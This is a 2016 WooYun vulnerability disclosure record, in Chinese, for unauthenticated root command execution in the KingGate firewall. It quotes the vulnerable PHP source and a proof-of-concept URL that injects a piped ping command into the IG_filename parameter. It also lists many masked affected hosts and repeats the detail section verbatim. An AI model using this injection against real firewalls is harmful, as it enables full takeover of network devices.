{"id": 87446, "wybug_id": "wooyun-2016-0180000", "wybug_title": "某防火墙远程命令执行二（cloudeye演示实例）                                      ", "wybug_corp": "深圳金山信息安全技术有限公司", "wybug_author": "老虎皮", "wybug_date": "2016-03-02 11:30", "wybug_open_date": "2016-06-04 20:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-04：\t细节向公众公开  简要描述： 厂商说不管，请管理员交给cert处理 详细说明：  无需登录，远程任意命令执行（root权限)，直接撸穿源代码，随意控制防火墙该设计缺陷新旧版本的KingGate防火墙通杀该设计缺陷新旧版本的KingGate防火墙通杀 \n\n \n\n通过案例一 **.**.**.**/bugs/wooyun-2016-0176999 我已经撸到了源代码在对源代码审计过程中发现一枚无需登录的远程命令执行漏洞在源代码src/application/log/auditmail.php中\n<? \trequire(\"../../lib/public.inc\");\trequire(\"../../lib/page_db.inc\");\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t$dir=\"./\";\t\t\t//\t**.**.**.**/spool/viewmail.php?IG_filename=2006-11-01-15-03-28-21050-1.eml&IG_type=POP3\t//\t2006-11-22-14-08-39-13588-1.eml\t$IG_filename=trim($IG_filename);\t//echo \"filename:$IG_filename<br>\";\tif ($IG_filename == \"\" || $table_name == \"\")\t\texit();\t$mail_dir=\"/var/log/infogate/mailgate/spool/\".substr($IG_filename,0,10);\t\t$tmpdir = substr( strrchr( $IG_filename, \"/\" ), 1 );\t$linkdir = \"/link/guitmp/audit/\".$IG_filename.\"/\";\t$tmpdir = \"/var/log/infogate/guitmp/audit/\".$IG_filename.\"/\";\t\tif (!file_exists($tmpdir)){\t\t$cmd=\"mkdir -p \".$tmpdir;\t\tsystem($cmd);    }\t\tif ($REQUEST_METHOD == \"GET\"){\t\tsystem(\"rm -rf $tmpdir/*\");\t\t$outfile = \"$tmpdir/ZR_sourcemail.eml\";\t\t$cmd=\"/usr/local/sbin/pickupfile $mail_dir/$IG_filename $outfile\";\t\tsystem($cmd);\t\t//echo \"$cmd<br><br>\";\t\t$cmd=\"/usr/local/sbin/ripmime -i $outfile -d \".$tmpdir.\" -e -p zrmail  --overwrite --prefix  > /dev/null\";\t\t//echo \"$cmd<br>\";\t\tsystem($cmd);\t\t\t\t\t$cmd=\"chmod a+wr $tmpdir -R \";\t\tsystem($cmd);\n该套防火墙采用伪全局方式获取变量，其中变量IG_filename 可控，并未过滤或者其他安全处理\n$tmpdir = \"/var/log/infogate/guitmp/audit/\".$IG_filename.\"/\";\n进而导致$tmpdir可控，而$tmpdir又是直接进入system函数直接执行命令，所以导致直接远程命令执行（无需登录）所以只要我们构造好特殊的命令即可执行**.**.**.**/src/application/log/auditmail.php?IG_filename=1|ping xxxxx.xxxx.dnslog.info &table_name=3333\n\n查看cloudeye的dns日志\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   漏洞证明：  通过案例一 **.**.**.**/bugs/wooyun-2016-0176999 我已经撸到了源代码在对源代码审计过程中发现一枚无需登录的远程命令执行漏洞在源代码src/application/log/auditmail.php中\n<? \trequire(\"../../lib/public.inc\");\trequire(\"../../lib/page_db.inc\");\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t$dir=\"./\";\t\t\t//\t**.**.**.**/spool/viewmail.php?IG_filename=2006-11-01-15-03-28-21050-1.eml&IG_type=POP3\t//\t2006-11-22-14-08-39-13588-1.eml\t$IG_filename=trim($IG_filename);\t//echo \"filename:$IG_filename<br>\";\tif ($IG_filename == \"\" || $table_name == \"\")\t\texit();\t$mail_dir=\"/var/log/infogate/mailgate/spool/\".substr($IG_filename,0,10);\t\t$tmpdir = substr( strrchr( $IG_filename, \"/\" ), 1 );\t$linkdir = \"/link/guitmp/audit/\".$IG_filename.\"/\";\t$tmpdir = \"/var/log/infogate/guitmp/audit/\".$IG_filename.\"/\";\t\tif (!file_exists($tmpdir)){\t\t$cmd=\"mkdir -p \".$tmpdir;\t\tsystem($cmd);    }\t\tif ($REQUEST_METHOD == \"GET\"){\t\tsystem(\"rm -rf $tmpdir/*\");\t\t$outfile = \"$tmpdir/ZR_sourcemail.eml\";\t\t$cmd=\"/usr/local/sbin/pickupfile $mail_dir/$IG_filename $outfile\";\t\tsystem($cmd);\t\t//echo \"$cmd<br><br>\";\t\t$cmd=\"/usr/local/sbin/ripmime -i $outfile -d \".$tmpdir.\" -e -p zrmail  --overwrite --prefix  > /dev/null\";\t\t//echo \"$cmd<br>\";\t\tsystem($cmd);\t\t\t\t\t$cmd=\"chmod a+wr $tmpdir -R \";\t\tsystem($cmd);\n该套防火墙采用伪全局方式获取变量，其中变量IG_filename 可控，并未过滤或者其他安全处理\n$tmpdir = \"/var/log/infogate/guitmp/audit/\".$IG_filename.\"/\";\n进而导致$tmpdir可控，而$tmpdir又是直接进入system函数直接执行命令，所以导致直接远程命令执行（无需登录）所以只要我们构造好特殊的命令即可执行**.**.**.**/src/application/log/auditmail.php?IG_filename=1|ping xxxxx.xxxx.dnslog.info &table_name=3333\n\n查看cloudeye的dns日志\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   修复方案：     版权声明：转载请注明来源 老虎皮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-06 20:27 厂商回复： CNVD未直接复现所述漏洞情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-02 11:32 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  666    \n     2016-03-02 11:54 |    \t\t我是壮丁  \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:4        | 专业打酱油)\t\t \n  这是安全厂商还是后门厂商？    \n     2016-03-02 12:23 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  180000 靓号。    \n     2016-03-02 13:37 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5265 漏洞数:404        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @zeracker 188888 才是靓号    \n     2016-03-06 20:32 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  后排膜拜前排大牛    \n     2016-03-06 21:51 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  @猪猪侠 期待了。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}